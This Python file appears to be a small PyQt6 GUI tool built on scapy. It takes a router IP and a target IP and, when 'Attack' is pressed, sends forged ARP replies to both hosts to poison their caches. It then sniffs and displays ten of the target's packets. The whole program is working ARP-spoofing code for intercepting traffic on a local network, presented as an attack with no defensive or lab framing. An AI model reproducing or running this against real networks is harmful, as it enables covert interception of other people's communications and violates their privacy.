from PyQt6 import QtCore, QtGui, QtWidgets
from scapy.all import *



class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(785, 600)
        self.centralwidget = QtWidgets.QWidget(parent=MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.textEdit = QtWidgets.QTextEdit(parent=self.centralwidget)
        self.textEdit.setGeometry(QtCore.QRect(390, 10, 381, 441))
        self.textEdit.setObjectName("textEdit")
        self.sniff_pushButton = QtWidgets.QPushButton(parent=self.centralwidget)
        self.sniff_pushButton.setGeometry(QtCore.QRect(650, 460, 121, 71))
        self.sniff_pushButton.setObjectName("sniff_pushButton")
        self.attackButton = QtWidgets.QPushButton(parent=self.centralwidget)
        self.attackButton.setGeometry(QtCore.QRect(210, 470, 75, 61))
        self.attackButton.setObjectName("attackButton")
        self.target_label = QtWidgets.QLabel(parent=self.centralwidget)
        self.target_label.setGeometry(QtCore.QRect(20, 500, 71, 16))
        self.target_label.setObjectName("target_label")
        self.router_label = QtWidgets.QLabel(parent=self.centralwidget)
        self.router_label.setGeometry(QtCore.QRect(20, 480, 71, 16))
        self.router_label.setObjectName("router_label")
        self.target_ip = QtWidgets.QLineEdit(parent=self.centralwidget)
        self.target_ip.setGeometry(QtCore.QRect(80, 500, 113, 20))
        self.target_ip.setObjectName("target_ip")
        self.router_ip = QtWidgets.QLineEdit(parent=self.centralwidget)
        self.router_ip.setGeometry(QtCore.QRect(80, 480, 113, 20))
        self.router_ip.setObjectName("router_ip")
        self.listWidget = QtWidgets.QListWidget(parent=self.centralwidget)
        self.listWidget.setGeometry(QtCore.QRect(20, 10, 361, 441))
        self.listWidget.setStyleSheet("background-color: rgb(63, 63, 63);\n"
"color: rgb(0, 255, 0);")
        self.listWidget.setObjectName("listWidget")
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(parent=MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 785, 21))
        self.menubar.setObjectName("menubar")
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(parent=MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

        self.attackButton.clicked.connect(self.pushAttack)
        self.listWidget.clicked.connect(self.follow_click)

    def follow_click(self):
        self.textEdit.clear()
        current= self.listWidget.currentItem()
        current= current.text()
        string_txt= str(current).partition(" ")
        show=self.packet_list[int(string_txt[0])]
        a= show.show(dump=True)
        self.textEdit.append(a)


    def pushAttack(self):
        self.listWidget.clear()
        router_ip = self.router_ip.text()
        target_ip = self.target_ip.text()
        # Get the MAC address of the router
        router_mac = sr1(ARP(pdst=router_ip), verbose=0).hwsrc

        # Get the MAC address of the target device
        target_mac = sr1(ARP(pdst=target_ip), verbose=0).hwsrc
        arp_router = ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip)
        arp_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)

        # Send the ARP packets
        send(arp_router)
        send(arp_target)
        
        self.packet_list=sniff(iface="Ethernet 2", filter="host " + target_ip, count=10, prn=lambda x: x.show())
        index=0
        for i in self.packet_list:
            index+=1
            pckt= str(index)+ " " + str(i)
            load = hexstr(i.payload)
            print(load)
            self.listWidget.addItem(pckt)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.sniff_pushButton.setText(_translate("MainWindow", "SNIFF"))
        self.attackButton.setText(_translate("MainWindow", "Attack"))
        self.target_label.setText(_translate("MainWindow", "TARGET IP:"))
        self.router_label.setText(_translate("MainWindow", "ROUTER IP:"))


if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec())
